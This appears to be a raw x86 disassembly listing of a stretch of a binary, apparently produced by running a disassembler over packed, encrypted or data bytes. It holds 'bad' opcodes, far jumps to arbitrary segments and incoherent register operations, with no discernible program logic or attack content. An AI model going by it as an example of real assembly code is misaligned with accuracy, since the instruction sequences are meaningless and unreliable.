  41673a:	aad    0x33
  41673c:	mov    ah,0x3e
  41673e:	inc    ebx
  41673f:	mov    ebp,0xaa00e24d
  416744:	sbb    bl,BYTE PTR [eax+0x77ab4982]
  41674a:	repnz leave 
  41674c:	loope  0x416794
  41674e:	pop    edx
  41674f:	pop    ds
  416750:	or     eax,0xbdbca55f
  416755:	xchg   DWORD PTR [edx],edi
  416757:	rcr    DWORD PTR [ebp+0x22e2968c],0xc3
  41675e:	sub    ebx,DWORD PTR [eax+edx*2-0x2c]
  416762:	aaa    
  416763:	mov    ebx,0xec2a2002
  416768:	fadd   DWORD PTR [ebx]
  41676a:	mov    DWORD PTR [esi-0x5ff79480],ebx
  416770:	push   ds
  416771:	les    ebx,FWORD PTR ds:0x7c11d07e
  416777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416778:	mov    al,ds:0x371fe42d
  41677d:	jmp    0x416788
  41677f:	push   ebx
  416780:	or     DWORD PTR ds:0xb1c37f92,edx
  416786:	add    al,0x9e
  416788:	call   0x908:0xfb2c625a
  41678f:	fld    TBYTE PTR [esi]
  416791:	cmc    
  416792:	rcl    bh,cl
  416794:	cwde   
  416795:	pop    ebx
  416796:	push   eax
  416797:	mov    ds:0x801c6d0f,eax
  41679c:	jno    0x416736
  41679e:	aaa    
  41679f:	xchg   esi,eax
  4167a0:	push   esp
  4167a1:	jne    0x4167a2
  4167a3:	mov    ds:0xbef189b,al
  4167a8:	push   ecx
  4167a9:	push   esi
  4167aa:	sub    BYTE PTR [edx-0x55],0xfc
  4167ae:	inc    edi
  4167af:	pop    ds
  4167b0:	mov    dh,0x74
  4167b2:	cmc    
  4167b3:	lea    ebx,[esi]
  4167b5:	fst    QWORD PTR [ecx+0x2c]
  4167b8:	pop    esi
  4167b9:	bswap  edi
  4167bb:	jmp    0xd637:0x1420aba3
  4167c2:	scas   eax,DWORD PTR es:[edi]
  4167c3:	test   eax,0x682f8ccd
  4167c8:	in     eax,dx
  4167c9:	dec    esi
  4167ca:	adc    eax,DWORD PTR [esi+0x7d]
  4167cd:	pop    ebx
  4167ce:	int    0xa6
  4167d0:	push   ss
  4167d1:	cmp    ebx,DWORD PTR [edi-0x3d]
  4167d4:	xchg   ecx,eax
  4167d5:	cmp    cl,BYTE PTR [ebx+0x64]
  4167d8:	push   esi
  4167d9:	adc    eax,edi
  4167db:	into   
  4167dc:	xor    dl,BYTE PTR [ebx]
  4167de:	xchg   ebp,eax
  4167df:	leave  
  4167e0:	cdq    
  4167e1:	pop    esp
  4167e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e3:	mov    al,ds:0xca23a195
  4167e8:	imul   esp,DWORD PTR ds:0x334ed911,0xffffffaf
  4167ef:	cli    
  4167f0:	and    al,0x91
  4167f2:	pop    eax
  4167f3:	mov    fs,eax
  4167f5:	call   0x56c7:0x84b76e54
  4167fc:	das    
  4167fd:	push   eax
  4167fe:	hlt    
  4167ff:	cmp    esp,DWORD PTR [edx]
  416801:	mov    cl,0xe6
  416803:	or     eax,0xce9f0a52
  416808:	cmp    BYTE PTR cs:[esi+ebx*8-0x2972ae8a],al
  416810:	add    dl,ah
  416812:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416813:	scas   eax,DWORD PTR es:[edi]
  416814:	scas   eax,DWORD PTR es:[edi]
  416815:	adc    al,0x41
  416817:	inc    edi
  416818:	jge    0x41679c
  41681a:	js     0x41680a
  41681c:	mov    BYTE PTR [ebx],al
  41681e:	xchg   ecx,eax
  41681f:	push   ebp
  416820:	sub    dh,cl
  416822:	and    al,0x22
  416824:	add    bh,ch
  416826:	xor    al,0x92
  416828:	neg    DWORD PTR ds:0xe3c96995
  41682e:	iret   
  41682f:	stos   DWORD PTR es:[edi],eax
  416830:	hlt    
  416831:	inc    edi
  416832:	pusha  
  416833:	lock sbb eax,0xff16978c
  416839:	pusha  
  41683a:	stos   DWORD PTR es:[edi],eax
  41683b:	fwait
  41683c:	(bad)  
  41683d:	(bad)  
  41683e:	fistp  DWORD PTR [esi+0x19]
  416841:	mov    al,ds:0x1a690710
  416846:	call   0x8925:0x471d39ff
  41684d:	push   edi
  41684e:	cdq    
  41684f:	pop    ss
  416850:	jnp    0x4168ac
  416852:	dec    ebp
  416853:	fidiv  DWORD PTR [eax+0x30d7991b]
  416859:	int    0x66
  41685b:	ja     0x4168a7
  41685d:	scas   al,BYTE PTR es:[edi]
  41685e:	loopne 0x41688e
  416860:	sahf   
  416861:	and    BYTE PTR [bp+si-0x3fdb],bl
  416866:	xchg   esi,eax
  416867:	lahf   
  416868:	sti    
  416869:	mov    ah,cl
  41686b:	mov    edi,0x645d5aa7
  416870:	out    dx,eax
  416871:	dec    ebp
  416872:	retf   0x430d
  416875:	pusha  
  416876:	sub    eax,0x406507dd
  41687b:	xchg   ecx,eax
  41687c:	call   0x9ba3b656
  416881:	ror    BYTE PTR [ebp-0x14],1
  416884:	xchg   BYTE PTR [ecx+0x5c35257],dh
  41688a:	jns    0x41688c
  41688c:	xchg   ebp,eax
  41688d:	cmp    DWORD PTR [ecx+edx*1+0x54],esp
  416891:	xlat   BYTE PTR ds:[ebx]
  416892:	and    ebp,edi
  416894:	in     al,0x73
  416896:	add    esp,DWORD PTR [esi+0x3ef58169]
  41689c:	inc    ebx
  41689d:	mov    ah,0x5a
  41689f:	ins    BYTE PTR es:[edi],dx
  4168a0:	(bad)  
  4168a1:	push   DWORD PTR [ebx+0x48]
  4168a4:	inc    edi
  4168a5:	dec    esi
  4168a6:	inc    esp
  4168a7:	adc    ecx,0xcf20ce6a
  4168ad:	dec    edx
  4168ae:	mov    al,0x16
  4168b0:	fxch   st(2)
  4168b2:	mov    edi,0x8956092a
  4168b7:	inc    esi
  4168b8:	jmp    FWORD PTR [eax]
  4168ba:	das    
  4168bb:	out    0x9c,eax
  4168bd:	pop    ss
  4168be:	push   ecx
  4168bf:	(bad)  
  4168c0:	aas    
  4168c1:	cmc    
  4168c2:	test   BYTE PTR [edx+0x59],cl
  4168c5:	icebp  
  4168c6:	cmp    esi,DWORD PTR ds:0xfa10c54b
  4168cc:	fisub  DWORD PTR [edi+0x26]
  4168cf:	mov    ah,0xaf
  4168d1:	sbb    DWORD PTR [ebx-0x44a6da87],esp
  4168d7:	(bad)  
  4168d8:	mov    BYTE PTR [edi-0x21],cl
  4168db:	or     esi,edi
  4168dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168de:	fs push esp
  4168e0:	(bad)  
  4168e1:	aam    0xcd
  4168e3:	xor    BYTE PTR [ecx+0x15bd2cbf],dl
  4168e9:	(bad)  
  4168ec:	jb     0x4168fc
  4168ee:	pop    ebx
  4168ef:	mov    dl,0x21
  4168f1:	and    ecx,DWORD PTR [edi]
  4168f3:	mov    bl,0xfb
  4168f5:	ds enter 0x8563,0x46
  4168fa:	jno    0x4168a0
  4168fc:	jo     0x41689c
  4168fe:	fs iret 
  416900:	mov    ebx,0xa35eb72b
  416905:	mov    esp,0xecff544e
  41690a:	inc    ebx
  41690b:	pop    ebp
  41690c:	pop    esp
  41690d:	ds push edx
  41690f:	mov    DWORD PTR [ecx-0x33],edi
  416912:	arpl   sp,si
  416914:	lock adc al,0x70
  416917:	adc    al,bh
  416919:	clc    
  41691a:	adc    eax,0xdb492386
  41691f:	imul   BYTE PTR [ebp-0x6c34b5f6]
  416925:	cmp    eax,0x627999cf
  41692a:	pop    ss
  41692b:	fcomp  DWORD PTR [ebp+0x24]
  41692e:	je     0x4168c3
  416930:	cmp    DWORD PTR [ebx+0x3e],esi
  416933:	pusha  
  416934:	nop
  416935:	dec    esp
  416936:	aam    0x2
  416938:	mov    bl,0x8b
  41693a:	dec    edi
  41693b:	mov    ah,0x68
  41693d:	fnstsw WORD PTR [eax-0x1188432]
  416943:	jl     0x41695b
  416945:	push   eax
  416946:	outs   dx,DWORD PTR ds:[esi]
  416947:	push   esp
  416948:	or     DWORD PTR [ebx-0x52],edi
  41694b:	loop   0x4169c1
  41694d:	mov    bl,0xcc
  41694f:	xchg   edx,eax
  416950:	scas   al,BYTE PTR es:[edi]
  416951:	ror    DWORD PTR ds:0x144c607b,1
  416957:	xchg   edi,eax
  416958:	xlat   BYTE PTR ds:[ebx]
  416959:	pop    esp
  41695a:	adc    ah,0x9c
  41695d:	lock fiadd WORD PTR [ecx+ebx*1-0x42]
  416962:	es ins BYTE PTR es:[edi],dx
  416964:	or     al,0x28
  416966:	inc    eax
  416967:	rcr    ebx,cl
  416969:	adc    eax,0x2ece10e8
  41696e:	jns    0x416966
  416970:	xchg   esp,eax
  416971:	push   edx
  416972:	cmp    DWORD PTR [eax+0x1ae091df],ecx
  416978:	add    al,0x8b
  41697a:	push   eax
  41697b:	xlat   BYTE PTR ds:[ebx]
  41697c:	xor    ch,bh
  41697e:	in     al,0x6a
  416980:	jno    0x41697c
  416982:	cli    
  416983:	(bad)  
  416984:	fild   DWORD PTR [ebx-0x260f2a20]
  41698a:	je     0x41694c
  41698c:	lods   al,BYTE PTR ds:[esi]
  41698d:	inc    ecx
  41698e:	gs loope 0x4169a4
  416991:	push   ecx
  416992:	daa    
  416993:	mov    eax,0xe920558b
  416998:	jge    0x4169c9
  41699a:	enter  0x7ff2,0xe7
  41699e:	xchg   edi,eax
  41699f:	add    bh,BYTE PTR [edi]
  4169a1:	out    dx,al
  4169a2:	fsubrp st(0),st
  4169a4:	mov    bl,0xab
  4169a6:	mov    esp,0x1a9e1f20
  4169ab:	dec    ebp
  4169ac:	repz fsub DWORD PTR [ebp-0x8822254]
  4169b3:	ror    DWORD PTR [esi+0x10962dbd],0x3d
  4169ba:	jb     0x416a1a
  4169bc:	jne    0x41697a
  4169be:	sbb    DWORD PTR [esi+0x3eac52ba],edx
  4169c4:	cld    
  4169c5:	stos   DWORD PTR es:[edi],eax
  4169c6:	test   BYTE PTR [edx-0x4],al
  4169c9:	mov    DWORD PTR [ebx-0x93bc0fa],edi
  4169cf:	push   ecx
  4169d0:	and    BYTE PTR [ebp+0x4f],bh
  4169d3:	inc    eax
  4169d4:	clc    
  4169d5:	jnp    0x416a15
  4169d7:	mov    eax,0xac71e0c1
  4169dc:	adc    DWORD PTR [ecx],0xffffff80
  4169df:	mov    DWORD PTR [ebx],edi
  4169e1:	push   edx
  4169e2:	bound  eax,QWORD PTR [ebx+0x72]
  4169e5:	dec    edx
  4169e6:	xchg   ebp,eax
  4169e7:	push   ss
  4169e8:	fldlg2 
  4169ea:	out    dx,al
  4169eb:	aas    
  4169ec:	sbb    DWORD PTR [ecx+0x26],0x83a2c5e6
  4169f3:	test   DWORD PTR [ecx+0x68d8ce1d],esi
  4169f9:	outs   dx,DWORD PTR ds:[esi]
  4169fa:	test   BYTE PTR [ecx+eax*1-0x24644268],cl
  416a01:	jge    0x4169ef
  416a03:	xchg   ecx,eax
  416a04:	jnp    0x4169d8
  416a06:	mov    dl,0x1a
  416a08:	pop    ecx
  416a09:	or     DWORD PTR [ebx-0x42],ecx
  416a0c:	jle    0x416995
  416a0e:	pushf  
  416a0f:	popa   
  416a10:	inc    ebp
  416a11:	in     al,dx
  416a12:	mov    ebp,0x89463a22
  416a17:	(bad)  
  416a18:	or     al,0x69
  416a1a:	stos   DWORD PTR es:[edi],eax
  416a1b:	out    0xd9,al
  416a1d:	ds jb  0x416a38
  416a20:	pop    esp
  416a21:	iret   
  416a22:	xor    bh,cl
  416a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a25:	test   BYTE PTR [edi-0x39],dh
  416a28:	jmp    0x290f2469
  416a2d:	enter  0x3843,0xeb
  416a31:	cs pushf 
  416a33:	cdq    
  416a34:	lahf   
  416a35:	pusha  
  416a36:	pop    esp
  416a37:	pop    es
  416a38:	or     esi,DWORD PTR [edx-0x73]
  416a3b:	add    DWORD PTR [esi+0x46b6423],eax
  416a41:	push   edi
  416a42:	xchg   edi,eax
  416a43:	shr    DWORD PTR [ecx],cl
  416a45:	cs xchg ebx,eax
  416a47:	ins    BYTE PTR es:[edi],dx
  416a48:	jp     0x416aab
  416a4a:	and    DWORD PTR [ecx+0x31db465],edx
  416a50:	pusha  
  416a51:	fsubr  QWORD PTR [edi]
  416a53:	dec    esp
  416a54:	ja     0x416a17
  416a56:	dec    edi
  416a57:	sar    BYTE PTR [edx-0x533c5258],1
  416a5d:	pop    edi
  416a5e:	push   ds
  416a5f:	cmc    
  416a60:	add    edx,esi
  416a62:	and    al,0x87
  416a64:	or     dl,BYTE PTR [eax-0x59]
  416a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a68:	pop    ebp
  416a69:	inc    esp
  416a6a:	into   
  416a6b:	cld    
  416a6c:	pop    esp
  416a6d:	leave  
  416a6e:	pop    esp
  416a6f:	shl    BYTE PTR [ebp+0xd],cl
  416a72:	pushf  
  416a73:	into   
  416a74:	leave  
  416a75:	hlt    
  416a76:	xchg   esi,eax
  416a77:	sub    eax,0x70a4786e
  416a7c:	pop    ecx
  416a7d:	gs sbb bh,dl
  416a80:	sbb    DWORD PTR [ebp-0x2e],ebx
  416a83:	stos   BYTE PTR es:[edi],al
  416a84:	fimul  WORD PTR [esp+edx*2+0x53f6df40]
  416a8b:	sbb    eax,DWORD PTR [eax-0xd]
  416a8e:	cmp    edx,DWORD PTR [esi]
  416a90:	popf   
  416a91:	pop    eax
  416a92:	(bad)  
  416a93:	rcr    BYTE PTR [esi],1
  416a95:	rcl    BYTE PTR [edi-0x3b],cl
  416a98:	nop
  416a99:	pop    ss
  416a9a:	(bad)  
  416a9b:	mov    bl,0xab
  416a9d:	pop    edi
  416a9e:	jmp    0x416a89
  416aa0:	js     0x416a89
  416aa2:	pop    ebx
  416aa3:	les    edx,FWORD PTR [ecx+0x1b]
  416aa6:	data16 jno 0x416b1d
  416aa9:	mov    bl,0xce
  416aab:	retf   
  416aac:	mov    bl,0x1b
  416aae:	sub    al,0xb1
  416ab0:	lea    ecx,[eax-0x4ee38ac4]
  416ab6:	and    DWORD PTR [edx-0x2130be2d],esi
  416abc:	or     bl,BYTE PTR [ebx-0xe]
  416abf:	rol    DWORD PTR [edi],0x9f
  416ac2:	or     DWORD PTR [ebx+0x32],0xfffffff1
  416ac6:	int    0x2d
  416ac8:	(bad)  
  416ac9:	or     BYTE PTR [ebx-0x4180407c],cl
  416acf:	fidivr DWORD PTR [ecx+0x4b]
  416ad2:	add    bh,BYTE PTR [ebx+0x79aefb27]
  416ad8:	push   ecx
  416ad9:	rcr    DWORD PTR [eax-0x4c],0x67
  416add:	adc    bl,BYTE PTR [ecx+esi*8]
  416ae0:	scas   al,BYTE PTR es:[edi]
  416ae1:	adc    DWORD PTR [eax+0x67],ebx
  416ae4:	pusha  
  416ae5:	repz loop 0x416b1c
  416ae8:	or     al,0x31
  416aea:	jmp    0x416b28
  416aec:	xor    eax,0x4c88a305
  416af1:	mov    ebp,0xed9a8015
  416af6:	pop    es
  416af7:	nop
  416af8:	xchg   ecx,eax
  416af9:	daa    
  416afa:	cmp    al,0x74
  416afc:	mov    al,0xe9
  416afe:	ret    
  416aff:	lock xchg esi,eax
  416b01:	frstor [edx-0x2b]
  416b04:	adc    eax,0xa8c69b86
  416b09:	push   eax
  416b0a:	adc    eax,0xb182cd10
  416b0f:	out    dx,al
  416b10:	imul   edx,edi,0x1da3cc03
  416b16:	ds push edx
  416b18:	jbe    0x416aea
  416b1a:	push   ecx
  416b1b:	or     eax,0xd5c00bef
  416b20:	fstp   QWORD PTR [eax-0x79]
  416b23:	ds test eax,0x2904b262
  416b29:	sbb    dl,BYTE PTR [ebp-0x6b]
  416b2c:	cwde   
  416b2d:	add    bl,BYTE PTR [edi-0x78]
  416b30:	sbb    BYTE PTR [edi+0x376efa01],al
  416b36:	ss jnp 0x416b31
  416b39:	leave  
  416b3a:	mov    ds:0x3f6c6209,al
  416b3f:	mov    al,ds:0x1ee90b58
  416b44:	add    eax,0xdea8e662
  416b49:	stos   BYTE PTR es:[edi],al
  416b4a:	jp     0x416b18
  416b4c:	test   BYTE PTR [esi+0x191fa15c],bl
  416b52:	mov    ds:0xd3013fb7,al
  416b57:	call   0x37f05a5b
  416b5c:	add    eax,DWORD PTR ds:0xfc9779c3
  416b62:	cmp    ah,cl
  416b64:	call   0x5a42:0x93cc9d4d
  416b6b:	and    DWORD PTR [esi+esi*8-0x4f],esi
  416b6f:	jo     0x416b7d
  416b71:	dec    eax
  416b72:	aam    0x81
  416b74:	ins    DWORD PTR es:[edi],dx
  416b75:	in     eax,0x25
  416b77:	jg     0x416bb8
  416b79:	scas   eax,DWORD PTR es:[edi]
  416b7a:	xchg   esp,eax
  416b7b:	push   ebx
  416b7d:	cmp    al,0xeb
  416b7f:	arpl   WORD PTR [ecx+0x45],bx
  416b82:	pop    es
  416b83:	lods   al,BYTE PTR ds:[esi]
  416b84:	scas   al,BYTE PTR es:[edi]
  416b85:	stc    
  416b86:	test   al,0xc7
  416b88:	ret    
  416b89:	add    bh,BYTE PTR [esi+0x12]
  416b8c:	(bad)  
  416b8e:	call   0xb68173e8
  416b93:	loope  0x416bb8
  416b95:	leave  
  416b96:	or     eax,0x8799e89a
  416b9b:	jbe    0x416c04
  416b9d:	leave  
  416b9e:	cmp    eax,0x957c40eb
  416ba3:	mov    dl,0x92
  416ba5:	into   
  416ba6:	(bad)  
  416ba7:	xlat   BYTE PTR ds:[ebx]
  416ba8:	pop    ebx
  416ba9:	adc    ebx,esi
  416bab:	mov    esi,0xbac5d1b0
  416bb0:	mov    eax,ds:0x61b61d5e
  416bb5:	jno    0x416c32
  416bb7:	stos   BYTE PTR es:[edi],al
  416bb8:	add    BYTE PTR [edx+0x7af16b3e],bh
  416bbe:	mov    edx,0xcd123302
  416bc3:	daa    
  416bc4:	push   esp
  416bc5:	sub    DWORD PTR [eax],0x84fbcdf
  416bcb:	dec    ebp
  416bcc:	pop    edx
  416bcd:	push   eax
  416bce:	push   ebx
  416bcf:	lahf   
  416bd0:	sar    DWORD PTR [esp+eax*4-0x43],1
  416bd4:	lahf   
  416bd5:	push   ds
  416bd6:	rcr    DWORD PTR [ebx+0x7c],0x4
  416bda:	in     eax,0xb5
  416bdc:	std    
  416bdd:	dec    ecx
  416bde:	push   0x54
  416be0:	rcl    DWORD PTR [esi+0xebfec83],0x39
  416be7:	(bad)  
  416be8:	jl     0x416c69
  416bea:	ds jmp 0xe86233f0
  416bf0:	pusha  
  416bf1:	mov    ds,WORD PTR [eax]
  416bf3:	push   esp
  416bf4:	dec    eax
  416bf5:	or     bl,bl
  416bf7:	dec    ecx
  416bf8:	in     al,dx
  416bf9:	xlat   BYTE PTR ds:[ebx]
  416bfa:	push   ebp
  416bfb:	dec    ecx
  416bfc:	jmp    0x4aec4a68
  416c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c02:	mov    eax,0xc17bcc7b
  416c07:	neg    BYTE PTR [edx+0x383d016]
  416c0d:	in     al,dx
  416c0e:	js     0x416b91
  416c10:	sub    al,0x69
  416c12:	xor    ah,ch
  416c14:	popa   
  416c15:	jecxz  0x416c26
  416c17:	into   
  416c18:	(bad)  
  416c19:	dec    esp
  416c1a:	xor    DWORD PTR [edi-0x6fbbfd22],0x4092a8ed
  416c24:	gs popf 
  416c26:	mov    esp,ss
  416c28:	adc    BYTE PTR [esp+ebp*1-0x2f829ade],ch
  416c2f:	pop    ebx
  416c30:	pop    ecx
  416c31:	mul    DWORD PTR [edx+0x9d7b67]
  416c37:	xchg   ebp,eax
  416c38:	inc    ebp
  416c39:	and    BYTE PTR [ecx+0x4b9e159e],0x82
  416c40:	call   0x920e:0xe974e62e
  416c47:	mov    BYTE PTR [ebp-0x70],bl
  416c4a:	cmp    eax,0x267abb8e
  416c4f:	iret   
  416c50:	dec    BYTE PTR [edx+edx*8+0x7a]
  416c54:	sbb    edx,0x9bca01f2
  416c5a:	push   ebx
  416c5b:	cwd    
  416c5d:	xchg   DWORD PTR [ebp+0x4c297a2],ecx
  416c63:	imul   BYTE PTR [ebx]
  416c65:	mov    ds:0xa4878431,eax
  416c6a:	mov    ah,0xf1
  416c6c:	jae    0x416ca0
  416c6e:	cmp    DWORD PTR [esi],ebx
  416c70:	rol    DWORD PTR [ebx+0x3c],1
  416c73:	or     eax,DWORD PTR [esi+ecx*4+0x777c6207]
  416c7a:	jmp    DWORD PTR [edi-0x4e]
  416c7d:	jns    0x416c38
  416c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c80:	mov    bh,0x99
  416c82:	ja     0x416c16
  416c84:	das    
  416c85:	cs test al,0x40
  416c88:	pop    ebx
  416c89:	leave  
  416c8a:	cwde   
  416c8b:	jmp    0xd03:0xb47d0315
  416c92:	je     0x416cc4
  416c94:	mov    BYTE PTR [ebx+0x5e718936],bl
  416c9a:	sub    ah,dl
  416c9c:	call   0x413d:0x3a9d29c1
  416ca3:	jnp    0x416c3a
  416ca5:	sbb    eax,0xc8773232
  416caa:	jmp    0x416ca2
  416cac:	loop   0x416cbe
  416cae:	mov    eax,ds:0xd8fff4bc
  416cb3:	dec    eax
  416cb4:	mov    edx,DWORD PTR [ebx+0x72]
  416cb7:	xchg   esi,eax
  416cb8:	push   edi
  416cb9:	and    al,0x41
  416cbb:	mov    ds:0x1013d501,eax
  416cc0:	ins    BYTE PTR es:[edi],dx
  416cc1:	and    al,0x42
  416cc3:	and    edi,DWORD PTR [edx+0x59]
  416cc6:	mov    edx,0x8da31f44
  416ccb:	sbb    BYTE PTR [esi],ah
  416ccd:	or     al,0x85
  416ccf:	mov    bl,0xf7
  416cd1:	dec    esp
  416cd2:	xchg   edi,eax
  416cd3:	aad    0x31
  416cd5:	in     al,0xe
  416cd7:	fist   DWORD PTR ds:0xaecd0dd0
  416cdd:	mov    ebx,0xb7c67aa9
  416ce2:	mov    ds:0xc7cd140f,al
  416ce7:	mov    al,ds:0x9e2d30f8
  416cec:	cmp    eax,0xee5ff904
  416cf1:	in     eax,0x7
  416cf3:	pop    ss
  416cf4:	pop    es
  416cf5:	(bad)  
  416cf6:	mov    dh,0x57
  416cf8:	cld    
  416cf9:	cmp    edx,DWORD PTR [esi]
  416cfb:	pop    ebx
  416cfc:	pop    es
  416cfd:	jne    0x416d3f
  416cff:	mov    ?,ebp
  416d01:	jns    0x416caa
  416d03:	(bad)  
  416d05:	mov    ds:0xbfe49908,eax
  416d0a:	push   es
  416d0b:	jmp    0x416cad
  416d0d:	add    eax,0xd03f4df9
  416d12:	mov    dl,0xde
  416d14:	rcr    eax,0x30
  416d17:	mov    ebx,0xc9c91622
  416d1c:	rcl    edx,1
  416d1e:	mov    ch,0xc9
  416d20:	pop    ecx
  416d21:	retf   0x62f8
  416d24:	xchg   ecx,eax
  416d25:	mov    ecx,0x2a653e91
  416d2a:	adc    eax,0xbc73b30d
  416d2f:	push   0xffffffc4
  416d31:	ins    BYTE PTR es:[edi],dx
  416d32:	not    dl
  416d34:	pop    ebp
  416d35:	push   ebx
  416d36:	in     al,dx
  416d37:	xchg   ecx,eax
  416d38:	ror    DWORD PTR [edx-0x8],0x97
  416d3c:	imul   edi,DWORD PTR [ebp+0x1a],0x61b7cde5
  416d43:	pusha  
  416d44:	(bad)  [edi]
  416d46:	add    esp,DWORD PTR [ecx]
  416d48:	jno    0x416d19
  416d4a:	in     al,dx
  416d4b:	adc    eax,DWORD PTR [esi-0x595150cb]
  416d51:	mov    bl,0x31
  416d53:	ret    0xfc05
  416d56:	sub    dh,BYTE PTR [ecx-0x2b]
  416d59:	sub    BYTE PTR [eax-0x73def1d6],al
  416d5f:	ins    DWORD PTR es:[edi],dx
  416d60:	scas   al,BYTE PTR es:[edi]
  416d61:	pop    ebx
  416d62:	into   
  416d63:	adc    ah,bl
  416d65:	sbb    DWORD PTR [esi],esp
  416d67:	sahf   
  416d68:	xor    eax,0xffce3407
  416d6d:	mov    esi,0x2131aefe
  416d72:	lds    edx,FWORD PTR [edi+0x5]
  416d75:	fsubr  DWORD PTR [ebp-0x2d]
  416d78:	dec    eax
  416d79:	mov    eax,ds:0xd7a21cbf
  416d7e:	push   ecx
  416d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d80:	xor    edx,DWORD PTR [edx+ebp*4-0x7ca422f5]
  416d87:	push   ebx
  416d88:	inc    ebx
  416d89:	push   ecx
  416d8a:	mov    esi,0xae488ae8
  416d8f:	add    esi,DWORD PTR ds:0x342700e0
  416d95:	xchg   di,ax
  416d97:	or     eax,0x43dfb651
  416d9c:	clc    
  416d9d:	pop    ds
  416d9e:	aam    0x57
  416da0:	xor    BYTE PTR [esi+0x2f],dl
  416da3:	test   DWORD PTR [ebx+edx*4],ecx
  416da6:	sbb    DWORD PTR [edx-0x53],eax
  416da9:	loop   0x416d61
  416dab:	cmp    ecx,ebp
  416dad:	push   0xffffffe9
  416daf:	outs   dx,DWORD PTR ss:[esi]
  416db1:	out    0x7e,eax
  416db3:	xor    eax,0x7c0b225f
  416db8:	lahf   
  416db9:	or     eax,0x6d0c417
  416dbe:	das    
  416dbf:	in     al,dx
  416dc0:	and    ecx,edi
  416dc2:	jb     0x416e07
  416dc4:	(bad)  
  416dc5:	out    0xb1,eax
  416dc7:	lock add al,0x4e
  416dca:	mov    ebp,0xd503df26
  416dcf:	jbe    0x416de5
  416dd1:	mov    bh,0x70
  416dd3:	jne    0x416df1
  416dd5:	ds hlt 
  416dd7:	je     0x416dd9
  416dd9:	fadd   QWORD PTR [ecx-0xdef1a1e]
  416ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416de0:	cmp    dl,BYTE PTR [ebx+0x7e]
  416de3:	jb     0x416dd5
  416de5:	cmp    al,0x26
  416de7:	hlt    
  416de8:	mov    bl,0x67
  416dea:	dec    esp
  416deb:	loopne 0x416db1
  416ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416def:	in     eax,dx
  416df0:	jmp    0x5c91:0x66e4c502
  416df7:	jns    0x416e4e
  416df9:	push   es
  416dfa:	cmp    bl,BYTE PTR [esp+esi*1+0x71]
  416dfe:	pushf  
  416dff:	dec    ebx
  416e00:	cli    
  416e01:	and    bh,BYTE PTR [eax]
  416e03:	pop    DWORD PTR [ebp+0x36529495]
  416e09:	lds    esp,FWORD PTR ds:0xdfb314fd
  416e0f:	mov    al,ds:0xdf88755e
  416e14:	mov    bh,0xa3
  416e16:	inc    eax
  416e17:	push   ds
  416e18:	fsubr  QWORD PTR [edi]
  416e1a:	cmp    al,BYTE PTR [ecx+0x47]
  416e1d:	push   0xba333e6
  416e22:	arpl   WORD PTR [ecx-0x56],dx
  416e25:	mov    WORD PTR [ecx+0x2],fs
  416e28:	aad    0xcb
  416e2a:	inc    ebx
  416e2b:	test   DWORD PTR [ebx+0x480b5b92],edx
  416e31:	ins    BYTE PTR es:[edi],dx
  416e32:	loope  0x416dbf
  416e34:	push   es
  416e35:	call   0xb81f2c58
  416e3a:	int3   
  416e3b:	sub    edi,DWORD PTR [ebx]
  416e3d:	xchg   ebx,eax
  416e3e:	je     0x416e2c
  416e40:	das    
  416e41:	mov    ecx,0x1b8ee4f0
  416e46:	or     eax,0xc256d6c4
  416e4b:	test   ah,ah
  416e4d:	ins    DWORD PTR es:[edi],dx
  416e4e:	lea    edi,[eax]
  416e50:	and    bh,BYTE PTR [ebx]
  416e52:	mov    ebx,0x20a2cf48
  416e57:	jbe    0x416de3
  416e59:	(bad)  
  416e5b:	and    cl,bh
  416e5d:	xchg   esp,eax
  416e5e:	rcr    DWORD PTR [eax],cl
  416e60:	arpl   cx,ax
  416e62:	test   al,0xb8
  416e64:	or     BYTE PTR [ecx+0x6372bdb5],ch
  416e6a:	xchg   ebx,eax
  416e6b:	ret    0x8eb6
  416e6e:	inc    edx
  416e6f:	sbb    edi,DWORD PTR [edx-0x2584e009]
  416e75:	adc    cl,BYTE PTR ds:0x1c3ee7ff
  416e7b:	jae    0x416ecd
  416e7d:	jecxz  0x416ee1
  416e7f:	push   ss
  416e80:	mov    ds:0x73da0c1d,eax
  416e85:	ins    DWORD PTR es:[edi],dx
  416e86:	fucom  st(2)
  416e88:	fwait
  416e89:	xchg   ecx,eax
  416e8a:	push   ebx
  416e8b:	jno    0x416ebe
  416e8d:	stos   BYTE PTR es:[edi],al
  416e8e:	jns    0x416ee0
  416e90:	cs ret 0x6c1d
  416e94:	cmc    
  416e95:	push   0xffffffc1
  416e97:	xchg   edx,eax
  416e98:	and    edx,ecx
  416e9a:	mov    al,0xe3
  416e9c:	sahf   
  416e9d:	sub    BYTE PTR [edx-0x53],dl
  416ea0:	push   ds
  416ea1:	and    ah,dl
  416ea3:	mov    ds,eax
  416ea5:	and    DWORD PTR [eax],ebx
  416ea7:	dec    esp
  416ea8:	mov    al,0x49
  416eaa:	cld    
  416eab:	nop
  416eac:	cld    
  416ead:	or     al,0xf4
  416eaf:	xor    esi,ecx
  416eb1:	div    esp
  416eb3:	outs   dx,BYTE PTR ds:[esi]
  416eb4:	or     esi,DWORD PTR [ebx]
  416eb6:	test   DWORD PTR [edi+ecx*1-0x2b],ebp
  416eba:	cmp    al,0x25
  416ebc:	mov    ch,0x46
  416ebe:	mov    ebx,?
  416ec0:	fnstenv ds:0x394db42f
  416ec6:	cld    
  416ec7:	fld    st(2)
  416ec9:	out    dx,al
  416eca:	(bad)  
  416ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ecd:	in     al,dx
  416ece:	ja     0x416eda
  416ed0:	xchg   ebp,eax
  416ed1:	int    0x6e
  416ed3:	ja     0x416ec1
  416ed5:	mov    bh,BYTE PTR [esi-0x35]
  416ed8:	xchg   ebx,eax
